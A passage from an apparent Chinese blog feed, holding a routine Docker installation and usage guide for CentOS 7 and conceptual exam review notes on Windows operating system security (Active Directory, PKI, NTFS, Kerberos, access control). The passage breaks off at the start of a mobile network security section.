title="声明"></a>声明</h3><p>环境：CentOS7 Minimal</p><p>参考：<a href="https://www.widuu.com/docker/installation/centos.html" target="_blank" rel="noopener">官方手册</a></p><p>由于 Docker 的局限性，Docker 只能运行在64位的系统中，所以只能在CentOS6.5及以上的系统才可以安装，需要内核版本是 2.6.32-431 或者更高版本 ；</p><h3 id="本地安装Docker"><a href="#本地安装Docker" class="headerlink" title="本地安装Docker"></a>本地安装Docker</h3><p>1.Docker 软件包已经包含在默认的 CentOS-Extras 软件源里，安装命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo yum -y install docker</span><br></pre></td></tr></table></figure><p>2.安装完成以后可以查看下载的Docker版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker -v</span><br></pre></td></tr></table></figure><p>3.安装完成以后启动Docker</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo service docker start</span><br></pre></td></tr></table></figure><p>4.如果希望 Docker 默认开机启动，如下操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo chkconfig docker on</span><br></pre></td></tr></table></figure><h3 id="使用镜像加速器"><a href="#使用镜像加速器" class="headerlink" title="使用镜像加速器"></a>使用镜像加速器</h3><p>没有镜像和容器的Docker是没有灵魂的，所以我们要去拉取镜像来创建容器，但是经过之前的踩坑，发现拉取Docker的官方镜像实在是太慢了，所以在拉取镜像之前可以使用阿里云的镜像加速器来解决拉取镜像速度太慢的问题，每个人的阿里云账号的容器镜像服务里应该都有一个镜像加速器地址；</p><p><img src="https://s2.ax1x.com/2019/06/01/V3BPLn.png" alt="V3BPLn.png"></p><p>vim修改<code>/etc/docker/daemon.json</code>的地址如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://xxxxxxx.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后使配置生效：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo systemctl daemon-reload</span><br></pre></td></tr></table></figure><p>重启Docker</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo service docker restart</span><br></pre></td></tr></table></figure><h3 id="使用docker用户组"><a href="#使用docker用户组" class="headerlink" title="使用docker用户组"></a>使用docker用户组</h3><p>一遍一遍地sudo都快烦死我了…为什么每次都需要sudo？？？</p><p>docker 进程通过监听一个 Unix Socket 来替代 TCP 端口。在默认情况下，docker 的 Unix Socket属于<code>root</code>用户，当然其他用户可以使用<code>sudo</code>方式来访问。因为这个原因， docker 进程就一直是<code>root</code>用户运行的。为了在使用 <code>docker</code> 命令的时候前边不再加<code>sudo</code>，我们需要创建一个叫 <code>docker</code> 的用户组，并且为用户组添加用户。然后在 <code>docker</code> 进程启动的时候，我们的 <code>docker</code> 群组有了 Unix Socket 的所有权，可以对 Socket 文件进行读写。</p><p>创建docker用户组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo groupadd docker</span><br></pre></td></tr></table></figure><p>将用户添加到docker用户组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo gpasswd -a gard3nia docker</span><br></pre></td></tr></table></figure><p>重启系统登录即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ reboot</span><br></pre></td></tr></table></figure><h2 id="Docker使用"><a href="#Docker使用" class="headerlink" title="Docker使用"></a>Docker使用</h2><h3 id="镜像操作"><a href="#镜像操作" class="headerlink" title="镜像操作"></a>镜像操作</h3><h4 id="1-搜索镜像"><a href="#1-搜索镜像" class="headerlink" title="1.搜索镜像"></a>1.搜索镜像</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search imagename</span><br></pre></td></tr></table></figure><h4 id="2-拉取镜像"><a href="#2-拉取镜像" class="headerlink" title="2.拉取镜像"></a>2.拉取镜像</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull imagename</span><br></pre></td></tr></table></figure><h4 id="3-列出本地镜像"><a href="#3-列出本地镜像" class="headerlink" title="3.列出本地镜像"></a>3.列出本地镜像</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><h4 id="4-删除镜像"><a href="#4-删除镜像" class="headerlink" title="4.删除镜像"></a>4.删除镜像</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi imagename</span><br></pre></td></tr></table></figure><h3 id="容器操作"><a href="#容器操作" class="headerlink" title="容器操作"></a>容器操作</h3><h4 id="1-新建容器"><a href="#1-新建容器" class="headerlink" title="1.新建容器"></a>1.新建容器</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run [OPTIONS] IMAGE [COMMAND] [ARG...]</span><br></pre></td></tr></table></figure><p>经常会用到的参数</p><ul><li><strong>-it:</strong> 其中，<code>-t</code> 选项让Docker分配一个伪终端（pseudo-tty）并绑定到容器的标准输入上， <code>-i</code> 则让容器的标准输入保持打开；</li><li><strong>–name:</strong> 为容器指定一个名称；</li><li><strong>-p:</strong> 指定端口映射，格式为：<strong>主机(宿主)端口:容器端口</strong>；</li><li><strong>-P:</strong> 随机端口映射，容器内部端口<strong>随机</strong>映射到主机的高端口；</li><li><strong>-v:</strong>指定文件夹映射，格式为：<strong>主机(宿主)文件夹:容器文件夹</strong>；</li><li><strong>-d:</strong> 后台运行容器，并返回容器ID；</li></ul><p>用拉取的centos镜像新建容器并进入bash终端：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker run --name centos1 -it centos /bin/bash</span><br></pre></td></tr></table></figure><p>退出交互式终端：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ exit</span><br></pre></td></tr></table></figure><h4 id="2-查看容器"><a href="#2-查看容器" class="headerlink" title="2.查看容器"></a>2.查看容器</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps [-a] [-l]</span><br></pre></td></tr></table></figure><ul><li><strong>-a :</strong>显示所有的容器，包括未运行的。</li><li><strong>-l :</strong>显示最近创建的容器。</li><li>没有参数默认查看运行容器的进程</li></ul><h4 id="3-停止容器"><a href="#3-停止容器" class="headerlink" title="3.停止容器"></a>3.停止容器</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker stop 容器name</span><br><span class="line">docker kill 容器name</span><br></pre></td></tr></table></figure><p>第一种是等待容器内进程结束再关闭，另外一种是直接强制结束容器</p><h4 id="4-开启容器"><a href="#4-开启容器" class="headerlink" title="4.开启容器"></a>4.开启容器</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start 容器name</span><br></pre></td></tr></table></figure><h4 id="5-重启容器"><a href="#5-重启容器" class="headerlink" title="5.重启容器"></a>5.重启容器</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker restart 容器name</span><br></pre></td></tr></table></figure><h4 id="6-后台运行"><a href="#6-后台运行" class="headerlink" title="6.后台运行"></a>6.后台运行</h4><p>一般的话我们在运行一个交互式的bash的时候，用的是 <code>ctrl+P</code>和 <code>ctrl+Q</code>键去退出这样就会在后台一直运行</p><h4 id="7-重新进入后台运行的容器"><a href="#7-重新进入后台运行的容器" class="headerlink" title="7.重新进入后台运行的容器"></a>7.重新进入后台运行的容器</h4><p>1.docker attach</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker attach [OPTIONS] CONTAINER</span><br></pre></td></tr></table></figure><p>2.docker exec</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec [-d] [-i] [-t] CONTAINER [command]</span><br></pre></td></tr></table></figure><h4 id="8-删除容器"><a href="#8-删除容器" class="headerlink" title="8.删除容器"></a>8.删除容器</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm [OPTIONS] CONTAINER</span><br></pre></td></tr></table></figure><ul><li><strong>-f :</strong>通过SIGKILL信号强制删除一个运行中的容器</li><li><strong>-l :</strong>移除容器间的网络连接，而非容器本身</li><li><strong>-v :</strong>-v 删除与容器关联的卷</li></ul><hr><p>Docker的强大还需更多学习，本文会做到动态更新！</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;本文是在学习Docker路上的踩坑记录…
    
    </summary>
    
      <category term="Docker" scheme="https://gardenia30.top/categories/Docker/"/>
    
    
      <category term="Docker" scheme="https://gardenia30.top/tags/Docker/"/>
    
      <category term="环境部署" scheme="https://gardenia30.top/tags/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
    
  </entry>
  
  <entry>
    <title>操作系统安全+移动网络安全复习</title>
    <link href="https://gardenia30.top/2019/05/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E5%A4%8D%E4%B9%A0/"/>
    <id>https://gardenia30.top/2019/05/09/操作系统安全复习/</id>
    <published>2019-05-09T08:48:35.000Z</published>
    <updated>2019-11-10T13:06:38.411Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>因考试复习而生的一篇博客…<a id="more"></a></p><h1 id="操作系统安全复习"><a href="#操作系统安全复习" class="headerlink" title="操作系统安全复习"></a>操作系统安全复习</h1><h2 id="第1-2章-windows系统安全概述"><a href="#第1-2章-windows系统安全概述" class="headerlink" title="第1~2章-windows系统安全概述"></a>第1~2章-windows系统安全概述</h2><h3 id="信息安全评估标准-TCSEC"><a href="#信息安全评估标准-TCSEC" class="headerlink" title="信息安全评估标准  TCSEC"></a>信息安全评估标准  TCSEC</h3><blockquote><p>A级：校验级保护，提供低级别手段</p><p>B3级：安全域，数据隐藏与分层，屏蔽</p><p>B2级：结构化内容保护，支持硬件保护</p><p>B1级：标记安全保护，如System V等</p><p>C2级：有自主的访问安全，区分用户</p><p>C1级：不区分用户，基本的访问控制</p><p>D级：没有安全性可言，MS DOS</p></blockquote><h3 id="Windows的安全体系结构，组件"><a href="#Windows的安全体系结构，组件" class="headerlink" title="Windows的安全体系结构，组件"></a>Windows的安全体系结构，组件</h3><p>Windows的NT体系结构分为</p><h4 id="内核模式"><a href="#内核模式" class="headerlink" title="内核模式"></a>内核模式</h4><p>1.代码具有极高的特权，可以直接对硬件进行操作和直接访问所有的内存空间</p><p>2.组成内核模式的整套服务被称为执行服务</p><p>​    对象管理器（OM:Object Manager）</p><p>​    安全引用监控器（SRM: security reference monitor） </p><h4 id="用户模式"><a href="#用户模式" class="headerlink" title="用户模式"></a>用户模式</h4><p>1.代码具有较低的权限，不能对硬件直接进行访问，内存访问受限</p><p>2.本地安全子系统：支持Windows的身份验证，审核 </p><p>​    核心：LSA（local security authentication）</p><p>​    需要和win32子系统通信</p><h4 id="本地安全授权（LSA）"><a href="#本地安全授权（LSA）" class="headerlink" title="本地安全授权（LSA）"></a>本地安全授权（LSA）</h4><p>1.LSA负责使所有本地和远程的用户登录生效，生成安全访问令牌; 访问令牌：访问令牌是一个二进制的数据包，它描述了用户的访问权限以及用户所属的组；</p><p>2.管理本地安全策略 </p><p>3.负责记录安全引用监视器(SRM)的任何审核 消息所产生的事件日志</p><h3 id="Windows-的用户和用户组"><a href="#Windows-的用户和用户组" class="headerlink" title="Windows 的用户和用户组"></a>Windows 的用户和用户组</h3><h4 id="用户账户"><a href="#用户账户" class="headerlink" title="用户账户"></a>用户账户</h4><p>1.使用用户名和密码进行标识</p><p>2.SID（Security Identifiers）：账户的关键标识符,所有内部进程都使用SID识别用户账号</p><h4 id="用户组账户"><a href="#用户组账户" class="headerlink" title="用户组账户"></a>用户组账户</h4><p>1.具有相似工作或资源要求的用户可组成一个用户组</p><p>2.对资源的存取权限许可分配给一用户组，就是同时分配 给该组中的所有成员</p><h4 id="内置用户账号"><a href="#内置用户账号" class="headerlink" title="内置用户账号"></a>内置用户账号</h4><p>Administrator 和 Guest ， Adminstrator账号是最高级别的账号，应重命名该账号 并设置密码以隐藏它，以免受到攻击，保持Guest账号的禁用状态。 </p><h4 id="内置用户组账号"><a href="#内置用户组账号" class="headerlink" title="内置用户组账号"></a>内置用户组账号</h4><blockquote><p>Administrators ：管理员组 </p><p>Guests ：来宾用户组 </p><p>Backup Operators 备份操作组，做系统的备份操作 </p><p>Replicator ：复制操作组 </p><p>Domain*(Administrators, Users, Guests) ：只 在域服务器上的组 </p><p>特殊组(Network, Interative,  Everyone, ….) </p><p>*Operators（Print ,Account, Server） </p></blockquote><h3 id="域及其信任关系"><a href="#域及其信任关系" class="headerlink" title="域及其信任关系"></a>域及其信任关系</h3><h4 id="域"><a href="#域" class="headerlink" title="域"></a>域</h4><h5 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h5><p>域是一批具有集中安全授权机构和若干台工作站和成员服务器的计算机集合。</p><h5 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h5><p>1.域为用户，组和计算机账户定义了管理边界范围 </p><p>2.一个域中的所有用户共享域用户账户数据库和普通的安全策略。</p><p>3.每台计算机不需要提供自己的验证服务。</p><p>4.一旦用户用域验证服务通过验证，就可以在域内访问权限内资源了，如<code>Exchange Server，SharePoint Server，File Server，SQL Server，打印机共享</code>。 </p><h4 id="信任关系"><a href="#信任关系" class="headerlink" title="信任关系"></a>信任关系</h4><p>当网络更大时，可以用信任关系来创建并链接多个域；</p><p>1.信任关系是域之间的关系，当域之间建立信任关系后，一个域就可以信任另一个域的用户访问自己的资源，而又不必在本域拥有这个用户的账户和口令；</p><p>2.好处：实现跨域的集中安全验证 ，支持用户的单一登录 ；</p><h4 id="信任关系种类"><a href="#信任关系种类" class="headerlink" title="信任关系种类"></a>信任关系种类</h4><p>1.单向信任关系： 信任域—&gt;受信任域 </p><p>2.双向信任关系：信任域<---->受信任域 </----></p><h2 id="第3章-活动目录"><a href="#第3章-活动目录" class="headerlink" title="第3章-活动目录"></a>第3章-活动目录</h2><h3 id="活动目录"><a href="#活动目录" class="headerlink" title="活动目录"></a>活动目录</h3><h4 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h4><p>1.活动目录是以层次化方式存储网络资源信息的目录；</p><p>2.通过它，组织机构可以有效地对分布式环境的网络对象进行共享和管理；</p><p>3.目录在网络安全方面扮演着中心授权机构的角色，从而使操作系统可以轻松验证用户身份并控制其对网络资源的访问</p><h4 id="功能机制"><a href="#功能机制" class="headerlink" title="功能机制"></a>功能机制</h4><p>1.单点登录</p><p>用户只需要登录一次就可以访问所有相互信任的应用系统</p><p>2.全局目录（Global Catalog）</p><ul><li>默认情况下，全局编录在域森林的初始域控制器上自动创建。该域控制器就称为全局编录服务器，后面也可配 置其他域控制器为全局编录服务器；</li><li>全局编录是一个域树或者域森林中的所有对象信息的中心仓库。它记录了AD中所有域对象的部分信息 以及架构信息和配置信息的完整副本；</li><li>执行两个关键目录任务：登录和查询；<ul><li>在客户登录时：向域控制器提供通用组成员信息 ，用户登录网络时，必须存在一台全局编录服务器，否则只能登录到本地，例外是“域管理组中的成员”。</li><li>在客户查询目录信息时，用户在发出查询请求时首先会送到最近的全局编录 （GC），通常GC可满足绝大多数查询，只有当查询 对象信息不在GC中时，服务器才会将查询转至对象所在域。从而实现跨所有域的搜索</li></ul></li></ul><p>3.智能的信息复制</p><ul><li>通过安装域控制器，可在整个网络环境中创建目录 的多份副本；</li><li>网络任何地方发生变化都会在整个网络中自动复制, 保证数据一致性；</li></ul><p>4.组策略：可以在不同层次上定义控制规则</p><h4 id="活动目录保存的信息"><a href="#活动目录保存的信息" class="headerlink" title="活动目录保存的信息"></a>活动目录保存的信息</h4><p><img src="https://s2.ax1x.com/2019/05/12/Eh0Pgg.png" alt="Eh0Pgg.png"></p><h3 id="活动目录对象"><a href="#活动目录对象" class="headerlink" title="活动目录对象"></a>活动目录对象</h3><h4 id="对象标准属性"><a href="#对象标准属性" class="headerlink" title="对象标准属性"></a>对象标准属性</h4><p><img src="https://s2.ax1x.com/2019/05/12/EhBXkt.png" alt="EhBXkt.png"></p><p><img src="https://s2.ax1x.com/2019/05/12/Eh69Cq.png" alt="Eh69Cq.png"></p><p><img src="https://s2.ax1x.com/2019/05/12/Eh67dJ.png" alt="Eh67dJ.png"></p><p><img src="https://s2.ax1x.com/2019/05/12/Eh6xsO.png" alt="Eh6xsO.png"></p><h4 id="命名规则"><a href="#命名规则" class="headerlink" title="命名规则"></a>命名规则</h4><p><img src="https://s2.ax1x.com/2019/05/12/Eh6qiR.png" alt="Eh6qiR.png"></p><h3 id="逻辑结构活动目录组件"><a href="#逻辑结构活动目录组件" class="headerlink" title="逻辑结构活动目录组件"></a>逻辑结构活动目录组件</h3><h4 id="组织单位"><a href="#组织单位" class="headerlink" title="组织单位"></a>组织单位</h4><p>组织单位主要用来委派对用户、组及资源集合的管理权限。组织单位是委派管理权限的最小分组，其特殊在于可连接组策略</p><p><img src="https://s2.ax1x.com/2019/05/12/EhcGlV.png" alt="EhcGlV.png"></p><h4 id="域-1"><a href="#域-1" class="headerlink" title="域"></a>域</h4><p><img src="https://s2.ax1x.com/2019/05/12/EhcBf1.png" alt="EhcBf1.png"></p><p><img src="https://s2.ax1x.com/2019/05/12/EhcXkj.png" alt="EhcXkj.png"></p><p><img src="https://s2.ax1x.com/2019/05/12/EhgS10.png" alt="EhgS10.png"></p><h4 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h4><p><img src="https://s2.ax1x.com/2019/05/12/EhgMnO.png" alt="EhgMnO.png"></p><h4 id="域森林"><a href="#域森林" class="headerlink" title="域森林"></a>域森林</h4><p><img src="https://s2.ax1x.com/2019/05/12/EhgIUJ.png" alt="EhgIUJ.png"></p><h3 id="物理结构活动目录组件"><a href="#物理结构活动目录组件" class="headerlink" title="物理结构活动目录组件"></a>物理结构活动目录组件</h3><p><img src="https://s2.ax1x.com/2019/05/12/EhzV5d.png" alt="EhzV5d.png"></p><h2 id="第4章-组策略"><a href="#第4章-组策略" class="headerlink" title="第4章-组策略"></a>第4章-组策略</h2><h3 id="组策略设置对象"><a href="#组策略设置对象" class="headerlink" title="组策略设置对象"></a>组策略设置对象</h3><p>计算机和用户是仅有的接收组策略的活动目录对象类型；</p><p><img src="https://s2.ax1x.com/2019/05/12/EhXFt1.png" alt="EhXFt1.png"></p><p><img src="https://s2.ax1x.com/2019/05/12/EhXNng.png" alt="EhXNng.png"></p><h3 id="组策略的应用顺序"><a href="#组策略的应用顺序" class="headerlink" title="组策略的应用顺序"></a>组策略的应用顺序</h3><p><img src="https://s2.ax1x.com/2019/05/12/EhzN2q.png" alt="EhzN2q.png"></p><h3 id="组策略的实现"><a href="#组策略的实现" class="headerlink" title="组策略的实现"></a>组策略的实现</h3><h4 id="企业框架的组织"><a href="#企业框架的组织" class="headerlink" title="企业框架的组织"></a>企业框架的组织</h4><h4 id="根据相应组织框架设计管理策略"><a href="#根据相应组织框架设计管理策略" class="headerlink" title="根据相应组织框架设计管理策略"></a>根据相应组织框架设计管理策略</h4><h4 id="与安全相关的设置"><a href="#与安全相关的设置" class="headerlink" title="与安全相关的设置"></a>与安全相关的设置</h4><h5 id="账户策略"><a href="#账户策略" class="headerlink" title="账户策略"></a>账户策略</h5><p>1.密码策略</p><p>2.账户锁定策略</p><p>3.kerberos策略</p><h5 id="本地策略"><a href="#本地策略" class="headerlink" title="本地策略"></a>本地策略</h5><p>1.审核策略</p><p>2.用户权利指派</p><p>3.安全选项</p><h4 id="可对不同层次安全单元进行策略设置"><a href="#可对不同层次安全单元进行策略设置" class="headerlink" title="可对不同层次安全单元进行策略设置"></a>可对不同层次安全单元进行策略设置</h4><h2 id="第5章-公钥基础结构"><a href="#第5章-公钥基础结构" class="headerlink" title="第5章-公钥基础结构"></a>第5章-公钥基础结构</h2><h3 id="公钥基础结构PKI"><a href="#公钥基础结构PKI" class="headerlink" title="公钥基础结构PKI"></a>公钥基础结构PKI</h3><h4 id="PKI组件"><a href="#PKI组件" class="headerlink" title="PKI组件"></a>PKI组件</h4><p><img src="https://s2.ax1x.com/2019/05/12/E4FEO1.png" alt="E4FEO1.png"></p><h5 id="1-证书颁发机构-CA"><a href="#1-证书颁发机构-CA" class="headerlink" title="1.证书颁发机构(CA)"></a>1.证书颁发机构(CA)</h5><p><img src="https://s2.ax1x.com/2019/05/12/E4knun.png" alt="E4knun.png"></p><p><img src="https://s2.ax1x.com/2019/05/12/E4kG34.png" alt="E4kG34.png"></p><p><img src="https://s2.ax1x.com/2019/05/12/E4kwE6.png" alt="E4kwE6.png"></p><p><img src="https://s2.ax1x.com/2019/05/12/E4Zxm9.png" alt="E4Zxm9.png"></p><h5 id="2-证书注册机构-RA"><a href="#2-证书注册机构-RA" class="headerlink" title="2.证书注册机构(RA)"></a>2.证书注册机构(RA)</h5><p><img src="https://s2.ax1x.com/2019/05/12/E4eDcF.png" alt="E4eDcF.png"></p><h5 id="3-证书库"><a href="#3-证书库" class="headerlink" title="3.证书库"></a>3.证书库</h5><p><img src="https://s2.ax1x.com/2019/05/13/E4MMQK.png" alt="E4MMQK.png"></p><h4 id="证书的使用及验证"><a href="#证书的使用及验证" class="headerlink" title="证书的使用及验证"></a>证书的使用及验证</h4><h2 id="第6章-文件系统安全"><a href="#第6章-文件系统安全" class="headerlink" title="第6章-文件系统安全"></a>第6章-文件系统安全</h2><h3 id="文件系统基础"><a href="#文件系统基础" class="headerlink" title="文件系统基础"></a>文件系统基础</h3><ul><li><p>机器硬盘，固态硬盘。</p></li><li><p>基本分区</p><p>MBR磁盘 ：32位 x86硬盘系统</p><ul><li>引导盘的第一个扇区</li></ul><p>GPT磁盘 ：64位 Itanium处理器</p></li><li><p>DBR:引导扇区，文件系统的第一个扇区、</p></li><li><p>MFT文件记录结构</p><ul><li>每个记录项分为记录头和属性列表两个部分</li><li>记录头里包含了本记录向的总体情况和信息</li><li>属性列表列出了该文件的所有属性</li></ul></li></ul><h3 id="NTFS"><a href="#NTFS" class="headerlink" title="NTFS"></a>NTFS</h3><p>又称文件夹与文件的访问权限。NTFS分为特殊访问和标准访问权限。特殊权限是最小粒度的权限，标准权限是将某些常用的特殊权限配套组成的六种。</p><ul><li>权限控制的原则<ul><li>权限积累</li><li>以文件夹为权限的设置对象</li><li>拒绝权限优于其他权限</li></ul></li></ul><h3 id="EFS"><a href="#EFS" class="headerlink" title="EFS"></a>EFS</h3><ul><li>基于混合加密机制</li><li>EFS机制</li><li>提供数据恢复功能</li></ul><h4 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h4><ul><li>文件被考到临时文本文件</li><li>文件被一个随机生成的key加密</li><li>用户公钥对FEK加密，数据解密区生产。</li><li>使用恢复代理的公钥对FEK加密，数去恢复区域产生</li><li>所有内容被写进磁盘</li><li>临时文件删除</li></ul><h3 id="磁盘配额"><a href="#磁盘配额" class="headerlink" title="磁盘配额"></a>磁盘配额</h3><ul><li><p>作用</p><p>避免由于磁盘空间使用的失控可能造成的系统崩溃。</p></li><li><p>配额是以文件所有权为基础的，不受位置限制。</p></li><li><p>只适用于卷，且不受卷的文件夹结构以物理磁盘影响。</p></li></ul><h3 id="数据备份的策略，RAID机制的几种备份机制"><a href="#数据备份的策略，RAID机制的几种备份机制" class="headerlink" title="数据备份的策略，RAID机制的几种备份机制"></a>数据备份的策略，RAID机制的几种备份机制</h3><h4 id="完全备份"><a href="#完全备份" class="headerlink" title="完全备份"></a>完全备份</h4><h4 id="差异备份"><a href="#差异备份" class="headerlink" title="差异备份"></a>差异备份</h4><p>在一次完全备份后对修改的文件备份。不清除标记。</p><h4 id="增量备份"><a href="#增量备份" class="headerlink" title="增量备份"></a>增量备份</h4><p>备份自上一次备份之后有变化的数据。清除标记。</p><h2 id="第7章-身份验证"><a href="#第7章-身份验证" class="headerlink" title="第7章-身份验证"></a>第7章-身份验证</h2><h3 id="针对字典、穷举攻击的防范策略"><a href="#针对字典、穷举攻击的防范策略" class="headerlink" title="针对字典、穷举攻击的防范策略"></a>针对字典、穷举攻击的防范策略</h3><p><img src="https://s2.ax1x.com/2019/05/13/E5u6Z4.png" alt="E5u6Z4.png"></p><h3 id="交互式本地登录组件"><a href="#交互式本地登录组件" class="headerlink" title="交互式本地登录组件"></a>交互式本地登录组件</h3><p><img src="https://s2.ax1x.com/2019/05/13/E5ufRx.png" alt="E5ufRx.png"></p><p><img src="https://s2.ax1x.com/2019/05/13/E5uoLD.png" alt="E5uoLD.png"></p><p><img src="https://s2.ax1x.com/2019/05/13/E5u7ee.png" alt="E5u7ee.png"></p><p><img src="https://s2.ax1x.com/2019/05/13/E5uHdH.png" alt="E5uHdH.png"></p><h3 id="域登录组件"><a href="#域登录组件" class="headerlink" title="域登录组件"></a>域登录组件</h3><h3 id="kerberos协议"><a href="#kerberos协议" class="headerlink" title="kerberos协议"></a>kerberos协议</h3><p><img src="https://s2.ax1x.com/2019/05/13/E5Y9mt.png" alt="E5Y9mt.png"></p><p><img src="https://s2.ax1x.com/2019/05/13/E5Yx4U.png" alt="E5Yx4U.png"></p><h3 id="kerberos协议身份验证和票据授予服务"><a href="#kerberos协议身份验证和票据授予服务" class="headerlink" title="kerberos协议身份验证和票据授予服务"></a>kerberos协议身份验证和票据授予服务</h3><p><img src="https://s2.ax1x.com/2019/05/13/E5tsaV.png" alt="E5tsaV.png"></p><p>过程：</p><p><img src="https://s2.ax1x.com/2019/05/13/E5Dec8.png" alt="E5Dec8.png"></p><h3 id="kerberos策略"><a href="#kerberos策略" class="headerlink" title="kerberos策略"></a>kerberos策略</h3><p><img src="https://s2.ax1x.com/2019/05/13/E5DlAs.png" alt="E5DlAs.png"></p><h2 id="第8章-访问控制"><a href="#第8章-访问控制" class="headerlink" title="第8章-访问控制"></a>第8章-访问控制</h2><h3 id="Windows的访问控制模型及组件"><a href="#Windows的访问控制模型及组件" class="headerlink" title="Windows的访问控制模型及组件"></a>Windows的访问控制模型及组件</h3><h4 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h4><p>SRM和OM</p><p><img src="https://s2.ax1x.com/2019/05/13/E52mPH.png" alt="E52mPH.png"></p><p><img src="https://s2.ax1x.com/2019/05/13/E52KxI.png" alt="E52KxI.png"></p><h4 id="自主访问控制（Discretionary-access-control-DAC）"><a href="#自主访问控制（Discretionary-access-control-DAC）" class="headerlink" title="自主访问控制（Discretionary access control:DAC）"></a>自主访问控制（Discretionary access control:DAC）</h4><p><img src="https://s2.ax1x.com/2019/05/13/E5r8VH.png" alt="E5r8VH.png"></p><h4 id="基于角色的访问控制（Role-based-access-control-RBAC）"><a href="#基于角色的访问控制（Role-based-access-control-RBAC）" class="headerlink" title="基于角色的访问控制（Role based access control :RBAC）"></a>基于角色的访问控制（Role based access control :RBAC）</h4><p><img src="https://s2.ax1x.com/2019/05/13/E5yCBF.png" alt="E5yCBF.png"></p><h4 id="强制访问控制（Mandatory-access-control：MAC）"><a href="#强制访问控制（Mandatory-access-control：MAC）" class="headerlink" title="强制访问控制（Mandatory access control：MAC）"></a>强制访问控制（Mandatory access control：MAC）</h4><p><img src="https://s2.ax1x.com/2019/05/13/E5rcin.png" alt="E5rcin.png"></p><h4 id="基于属性的访问控制模型-（ABAC）"><a href="#基于属性的访问控制模型-（ABAC）" class="headerlink" title="基于属性的访问控制模型 （ABAC）"></a>基于属性的访问控制模型 （ABAC）</h4><p><img src="https://s2.ax1x.com/2019/05/13/E5ySXT.png" alt="E5ySXT.png"></p><h3 id="主体和客体的安全描述"><a href="#主体和客体的安全描述" class="headerlink" title="主体和客体的安全描述"></a>主体和客体的安全描述</h3><p>主体：令牌</p><p>客体：安全描述符</p><h3 id="冲突解决方法"><a href="#冲突解决方法" class="headerlink" title="冲突解决方法"></a>冲突解决方法</h3><p>拒绝ACE在允许ACE之前</p><p>直接ACE在继承ACE之前</p><p>从第一层（父对象）继承下来的ACE在其他ACE前面 </p><h1 id="移动网络安全复习"><a href="#移动网络安全复习" class="headerlink" title="移动网络安全复习"></a>移动网络安全复习</h1><h2 id="无线网络分类-按传播范围"><a href="#无线网络分类-按传播范围" class="headerlink" title="无线网络分类(按传播范围)"></a>无线网络分类(按传播范围)</h2><ol><li><p>无线个域网<code>Wireless Personal Area 